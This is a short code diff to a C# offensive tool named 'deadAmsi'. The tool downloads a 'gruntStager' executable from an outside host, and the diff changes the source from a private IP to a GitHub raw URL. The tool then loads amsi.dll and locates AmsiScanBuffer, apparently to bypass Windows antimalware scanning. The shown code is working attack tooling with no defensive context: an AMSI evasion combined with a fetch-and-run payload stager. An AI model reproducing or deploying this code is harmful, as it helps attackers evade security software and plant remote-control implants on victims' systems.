@@ -9,8 +9,9 @@ namespace deadAmsi
     {
         private static void Main(string[] args)
         {
+            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
             var client = new WebClient();
-            var gruntStager = client.DownloadData("http://10.10.10.10/deadpayload.exe");
+            var gruntStager = client.DownloadData("https://github.com/deadone/scripting-dev/raw/master/other/dead2.exe");
 
             var amsiDll = Win32.LoadLibrary("amsi.dll");
             var asbAddress = Win32.GetProcAddress(amsiDll, "AmsiScanBuffer");
